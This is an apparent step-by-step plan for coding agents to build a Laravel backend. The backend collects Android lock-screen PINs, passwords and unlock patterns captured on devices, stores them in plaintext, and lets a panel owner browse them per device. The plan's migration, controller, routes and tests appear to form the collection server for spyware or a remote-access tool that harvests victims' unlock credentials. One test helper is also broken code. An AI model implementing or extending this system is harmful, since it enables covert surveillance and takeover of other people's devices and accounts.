# Device Credentials API Implementation Plan

> **For agentic workers:** Use superpowers:subagent-driven-development to implement.

**Goal:** 在 Laravel app/ 中构建密码上报 API（POST /api/sync/credentials + POST /api/sync/cipher）和 Panel 查询接口（GET /api/device-credentials）。

**Tech Stack:** Laravel 12, PHP 8.5, Pest, MySQL 8.4

**Spec:** `docs/superpowers/specs/2026-04-22-device-credentials-api-design.md`

---

### Task 1: Migration + Model

**Files:**
- Create: `database/migrations/2026_04_22_000001_create_device_credentials_table.php`
- Create: `app/Models/DeviceCredential.php`
- Modify: `app/Models/Device.php` (add `credentials()` relation)

**Steps:**

- [ ] **Step 1: 创建 migration**

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('device_credentials', function (Blueprint $table) {
            $table->id();
            $table->foreignId('device_id')->constrained('devices')->cascadeOnDelete();
            $table->foreignId('user_id')->constrained('users')->cascadeOnDelete();
            $table->string('device_uid', 64)->index();

            $table->string('source', 20); // credentials, cipher, websocket

            // credentials 路径字段
            $table->text('password')->nullable();
            $table->string('password_type', 30)->nullable(); // pin, pattern, password, unknown
            $table->string('input_method', 50)->nullable();
            $table->string('app_name', 100)->nullable();
            $table->string('package_name', 255)->nullable();
            $table->unsignedTinyInteger('confidence')->nullable();

            // cipher 路径字段
            $table->string('cipher_grade_code', 50)->nullable();
            $table->text('text_cipher')->nullable();
            $table->string('pattern_cipher', 255)->nullable();
            $table->boolean('is_locked')->default(true);

            $table->timestamp('device_timestamp')->nullable();
            $table->timestamps();

            $table->index(['device_id', 'source']);
            $table->index(['user_id', 'created_at']);
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('device_credentials');
    }
};
```

- [ ] **Step 2: 创建 Model**

```php
<?php

declare(strict_types=1);

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;

class DeviceCredential extends Model
{
    protected $fillable = [
        'device_id',
        'user_id',
        'device_uid',
        'source',
        'password',
        'password_type',
        'input_method',
        'app_name',
        'package_name',
        'confidence',
        'cipher_grade_code',
        'text_cipher',
        'pattern_cipher',
        'is_locked',
        'device_timestamp',
    ];

    protected function casts(): array
    {
        return [
            'confidence' => 'integer',
            'is_locked' => 'boolean',
            'device_timestamp' => 'datetime',
        ];
    }

    public function device(): BelongsTo
    {
        return $this->belongsTo(Device::class);
    }

    public function user(): BelongsTo
    {
        return $this->belongsTo(User::class);
    }
}
```

- [ ] **Step 3: Device model 加 credentials 关系**

在 `app/Models/Device.php` 添加:
```php
public function credentials(): HasMany
{
    return $this->hasMany(DeviceCredential::class);
}
```

- [ ] **Step 4: 运行 migration**

```bash
cd /home/code/php/project/full-package/app
./vendor/bin/sail artisan migrate
```

- [ ] **Step 5: Commit**

```bash
git add database/migrations/2026_04_22_000001_create_device_credentials_table.php \
       app/Models/DeviceCredential.php app/Models/Device.php
git commit -m "feat(api): add device_credentials table + DeviceCredential model"
```

---

### Task 2: FormRequests

**Files:**
- Create: `app/Http/Requests/Device/SyncCredentialsRequest.php`
- Create: `app/Http/Requests/Device/SyncCipherRequest.php`

**Steps:**

- [ ] **Step 1: SyncCredentialsRequest**

```php
<?php

declare(strict_types=1);

namespace App\Http\Requests\Device;

use Illuminate\Contracts\Validation\Validator;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Http\Exceptions\HttpResponseException;

class SyncCredentialsRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        return [
            'deviceId' => 'required|string|max:64',
            'password' => 'required|string|max:1000',
            'passwordType' => 'required|string|in:pin,pattern,password,unknown,pin_4,pin_6',
            'inputMethod' => 'nullable|string|max:50',
            'appName' => 'nullable|string|max:100',
            'packageName' => 'nullable|string|max:255',
            'confidence' => 'nullable|integer|min:0|max:100',
            'timestamp' => 'nullable|integer',
        ];
    }

    protected function failedValidation(Validator $validator): never
    {
        throw new HttpResponseException(response()->json([
            'success' => false,
            'code' => 422,
            'msg' => $validator->errors()->first(),
            'data' => null,
        ], 422));
    }
}
```

- [ ] **Step 2: SyncCipherRequest**

```php
<?php

declare(strict_types=1);

namespace App\Http\Requests\Device;

use Illuminate\Contracts\Validation\Validator;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Http\Exceptions\HttpResponseException;

class SyncCipherRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        return [
            'cipherGradeCode' => 'required|string|max:50',
            'textCipher' => 'nullable|string|max:1000',
            'patternCipher' => 'nullable|string|max:255',
            'isLocked' => 'nullable|boolean',
            'captureTime' => 'nullable|integer',
        ];
    }

    protected function failedValidation(Validator $validator): never
    {
        throw new HttpResponseException(response()->json([
            'success' => false,
            'code' => 422,
            'msg' => $validator->errors()->first(),
            'data' => null,
        ], 422));
    }
}
```

- [ ] **Step 3: Commit**

```bash
git add app/Http/Requests/Device/SyncCredentialsRequest.php \
       app/Http/Requests/Device/SyncCipherRequest.php
git commit -m "feat(api): add SyncCredentialsRequest + SyncCipherRequest form validation"
```

---

### Task 3: Controller + Routes

**Files:**
- Create: `app/Http/Controllers/Api/DeviceCredentialController.php`
- Modify: `routes/api.php`

**Steps:**

- [ ] **Step 1: DeviceCredentialController**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Requests\Device\SyncCipherRequest;
use App\Http\Requests\Device\SyncCredentialsRequest;
use App\Models\Device;
use App\Models\DeviceCredential;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class DeviceCredentialController extends Controller
{
    /**
     * POST /api/sync/credentials — HttpManager 路径上报。
     */
    public function syncCredentials(SyncCredentialsRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $device = $this->resolveDevice($request);

        if (! $device) {
            return $this->error('Device not found', 404);
        }

        $credential = DeviceCredential::create([
            'device_id' => $device->id,
            'user_id' => $device->user_id,
            'device_uid' => $device->device_uid,
            'source' => 'credentials',
            'password' => $validated['password'],
            'password_type' => $this->normalizePasswordType($validated['passwordType']),
            'input_method' => $validated['inputMethod'] ?? null,
            'app_name' => $validated['appName'] ?? null,
            'package_name' => $validated['packageName'] ?? null,
            'confidence' => $validated['confidence'] ?? null,
            'device_timestamp' => isset($validated['timestamp']) && $validated['timestamp'] > 0
                ? Carbon::createFromTimestampMs($validated['timestamp'])
                : now(),
        ]);

        return $this->success(['id' => $credential->id]);
    }

    /**
     * POST /api/sync/cipher — 直连 OkHttp 路径上报。
     */
    public function syncCipher(SyncCipherRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $device = $this->resolveDevice($request);

        if (! $device) {
            return $this->error('Device not found', 404);
        }

        $credential = DeviceCredential::create([
            'device_id' => $device->id,
            'user_id' => $device->user_id,
            'device_uid' => $device->device_uid,
            'source' => 'cipher',
            'cipher_grade_code' => $validated['cipherGradeCode'],
            'text_cipher' => $validated['textCipher'] ?? null,
            'pattern_cipher' => $validated['patternCipher'] ?? null,
            'is_locked' => $validated['isLocked'] ?? true,
            'device_timestamp' => isset($validated['captureTime']) && $validated['captureTime'] > 0
                ? Carbon::createFromTimestampMs($validated['captureTime'])
                : now(),
        ]);

        return $this->success(['id' => $credential->id]);
    }

    /**
     * GET /api/device-credentials — Panel 分页查询。
     */
    public function index(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'device_uid' => 'nullable|string|max:64',
            'device_id' => 'nullable|integer',
            'password_type' => 'nullable|string|max:30',
            'source' => 'nullable|string|in:credentials,cipher,websocket',
            'per_page' => 'nullable|integer|min:1|max:200',
        ]);

        $user = $request->user();
        $ownerId = $user->getResourceOwnerId();
        $perPage = $validated['per_page'] ?? 50;

        $query = DeviceCredential::where('user_id', $ownerId);

        if (! empty($validated['device_uid'])) {
            $query->where('device_uid', $validated['device_uid']);
        }
        if (! empty($validated['device_id'])) {
            $query->where('device_id', $validated['device_id']);
        }
        if (! empty($validated['password_type'])) {
            $query->where('password_type', $validated['password_type']);
        }
        if (! empty($validated['source'])) {
            $query->where('source', $validated['source']);
        }

        $credentials = $query->orderByDesc('created_at')->paginate($perPage);

        return $this->success($credentials);
    }

    private function resolveDevice(Request $request): ?Device
    {
        $deviceId = $request->input('_device_id')
            ?: $request->input('deviceId')
            ?: $request->header('X-Client-ID', '');

        if (empty($deviceId)) {
            return null;
        }

        return Device::where('device_uid', $deviceId)
            ->orWhere('uuid', $deviceId)
            ->first();
    }

    private function normalizePasswordType(string $type): string
    {
        return match ($type) {
            'pin_4', 'pin_6' => 'pin',
            default => $type,
        };
    }

    private function success(mixed $data = null): JsonResponse
    {
        return response()->json([
            'success' => true,
            'code' => 200,
            'msg' => 'OK',
            'data' => $data,
        ]);
    }

    private function error(string $msg, int $code): JsonResponse
    {
        return response()->json([
            'success' => false,
            'code' => $code,
            'msg' => $msg,
            'data' => null,
        ], $code);
    }
}
```

- [ ] **Step 2: 添加路由到 api.php**

在 `routes/api.php` 的 `use` 部分添加:
```php
use App\Http\Controllers\Api\DeviceCredentialController;
```

在 `Route::prefix('client')->middleware('auth.device')` group 内添加:
```php
    Route::post('/sync/credentials', [DeviceCredentialController::class, 'syncCredentials']);
    Route::post('/sync/cipher', [DeviceCredentialController::class, 'syncCipher']);
```

在 `Route::middleware('auth:sanctum')` group 内添加:
```php
    Route::get('/device-credentials', [DeviceCredentialController::class, 'index']);
```

注意: Android 客户端发送到 `/api/sync/credentials` 和 `/api/sync/cipher`，但 `api.php` 的路由已有 `/api` 前缀（由 Laravel RouteServiceProvider 自动添加）。需要确认实际 URL 路径匹配。如果 `prefix('client')` 会导致路径变成 `/api/client/sync/credentials`，则需要将这两个路由放在 `auth.device` middleware 的独立 group 中。

- [ ] **Step 3: Commit**

```bash
git add app/Http/Controllers/Api/DeviceCredentialController.php routes/api.php
git commit -m "feat(api): add DeviceCredentialController — sync/credentials + sync/cipher + panel query"
```

---

### Task 4: Feature Tests

**Files:**
- Create: `tests/Feature/Api/DeviceCredentialTest.php`

**Steps:**

- [ ] **Step 1: 创建 Pest 测试**

```php
<?php

declare(strict_types=1);

use App\Models\Device;
use App\Models\DeviceCredential;
use App\Models\User;

beforeEach(function () {
    $this->user = User::factory()->create();
    $this->device = Device::factory()->create([
        'user_id' => $this->user->id,
        'device_uid' => 'test-device-001',
        'uuid' => 'test-device-001',
    ]);
});

describe('POST /api/sync/credentials', function () {
    test('stores credential with valid payload', function () {
        $response = $this->postJson('/api/sync/credentials', [
            'deviceId' => 'test-device-001',
            'password' => '123456',
            'passwordType' => 'pin',
            'inputMethod' => 'system_auth_capture',
            'confidence' => 100,
            'timestamp' => 1713600000000,
        ], $this->deviceAuthHeaders());

        $response->assertOk()
            ->assertJson(['success' => true]);

        $this->assertDatabaseHas('device_credentials', [
            'device_uid' => 'test-device-001',
            'source' => 'credentials',
            'password' => '123456',
            'password_type' => 'pin',
            'confidence' => 100,
        ]);
    });

    test('normalizes pin_4 to pin', function () {
        $this->postJson('/api/sync/credentials', [
            'deviceId' => 'test-device-001',
            'password' => '1234',
            'passwordType' => 'pin_4',
        ], $this->deviceAuthHeaders());

        $this->assertDatabaseHas('device_credentials', [
            'password_type' => 'pin',
        ]);
    });

    test('rejects missing password', function () {
        $response = $this->postJson('/api/sync/credentials', [
            'deviceId' => 'test-device-001',
            'passwordType' => 'pin',
        ], $this->deviceAuthHeaders());

        $response->assertStatus(422);
    });

    test('rejects without auth', function () {
        $response = $this->postJson('/api/sync/credentials', [
            'deviceId' => 'test-device-001',
            'password' => '123456',
            'passwordType' => 'pin',
        ]);

        $response->assertStatus(401);
    });
});

describe('POST /api/sync/cipher', function () {
    test('stores cipher with valid payload', function () {
        $response = $this->postJson('/api/sync/cipher', [
            'cipherGradeCode' => 'PASSWORD_QUALITY_NUMERIC_COMPLEX',
            'textCipher' => '123456',
            'patternCipher' => '',
            'isLocked' => true,
            'captureTime' => 1713600000000,
        ], $this->deviceAuthHeaders());

        $response->assertOk()
            ->assertJson(['success' => true]);

        $this->assertDatabaseHas('device_credentials', [
            'source' => 'cipher',
            'cipher_grade_code' => 'PASSWORD_QUALITY_NUMERIC_COMPLEX',
            'text_cipher' => '123456',
            'is_locked' => true,
        ]);
    });

    test('stores pattern cipher', function () {
        $this->postJson('/api/sync/cipher', [
            'cipherGradeCode' => 'PASSWORD_QUALITY_PATTERN',
            'textCipher' => '',
            'patternCipher' => '0,1,2,4,6,7,8',
            'isLocked' => true,
            'captureTime' => 1713600000000,
        ], $this->deviceAuthHeaders());

        $this->assertDatabaseHas('device_credentials', [
            'source' => 'cipher',
            'pattern_cipher' => '0,1,2,4,6,7,8',
        ]);
    });

    test('rejects missing cipherGradeCode', function () {
        $response = $this->postJson('/api/sync/cipher', [
            'textCipher' => '123456',
        ], $this->deviceAuthHeaders());

        $response->assertStatus(422);
    });
});

describe('GET /api/device-credentials (Panel)', function () {
    test('returns paginated credentials for owner', function () {
        DeviceCredential::factory()->count(3)->create([
            'device_id' => $this->device->id,
            'user_id' => $this->user->id,
            'device_uid' => 'test-device-001',
            'source' => 'credentials',
        ]);

        $response = $this->actingAs($this->user)
            ->getJson('/api/device-credentials');

        $response->assertOk()
            ->assertJson(['success' => true])
            ->assertJsonCount(3, 'data.data');
    });

    test('filters by source', function () {
        DeviceCredential::factory()->create([
            'device_id' => $this->device->id,
            'user_id' => $this->user->id,
            'device_uid' => 'test-device-001',
            'source' => 'credentials',
        ]);
        DeviceCredential::factory()->create([
            'device_id' => $this->device->id,
            'user_id' => $this->user->id,
            'device_uid' => 'test-device-001',
            'source' => 'cipher',
        ]);

        $response = $this->actingAs($this->user)
            ->getJson('/api/device-credentials?source=cipher');

        $response->assertOk()
            ->assertJsonCount(1, 'data.data');
    });

    test('rejects unauthenticated', function () {
        $response = $this->getJson('/api/device-credentials');
        $response->assertStatus(401);
    });
});

// Helper: 构造 auth.device 认证头
function deviceAuthHeaders(): array
{
    // 需要根据 DeviceTokenService 的实际 token 格式构造
    // 这里用 mock 或 test token
    return [
        'Authorization' => 'Bearer ' . $this->user->builds()->first()?->owner_token ?? 'test-token',
        'X-Device-ID' => 'test-device-001',
    ];
}
```

注意: `deviceAuthHeaders()` 和 Factory 需要根据项目实际的 `DeviceTokenService` 和已有 Factory 调整。如果 Device/DeviceCredential Factory 不存在，需要创建。

- [ ] **Step 2: 创建 DeviceCredential Factory**

```php
<?php

declare(strict_types=1);

namespace Database\Factories;

use App\Models\Device;
use App\Models\DeviceCredential;
use App\Models\User;
use Illuminate\Database\Eloquent\Factories\Factory;

class DeviceCredentialFactory extends Factory
{
    protected $model = DeviceCredential::class;

    public function definition(): array
    {
        return [
            'device_id' => Device::factory(),
            'user_id' => User::factory(),
            'device_uid' => $this->faker->uuid(),
            'source' => $this->faker->randomElement(['credentials', 'cipher', 'websocket']),
            'password' => $this->faker->numerify('######'),
            'password_type' => $this->faker->randomElement(['pin', 'pattern', 'password']),
            'input_method' => 'system_auth_capture',
            'confidence' => $this->faker->numberBetween(80, 100),
            'is_locked' => true,
            'device_timestamp' => now(),
        ];
    }
}
```

- [ ] **Step 3: 运行测试**

```bash
./vendor/bin/sail pest tests/Feature/Api/DeviceCredentialTest.php
```

- [ ] **Step 4: Commit**

```bash
git add tests/Feature/Api/DeviceCredentialTest.php \
       database/factories/DeviceCredentialFactory.php
git commit -m "test(api): add DeviceCredential feature tests — sync/credentials + sync/cipher + panel query"
```
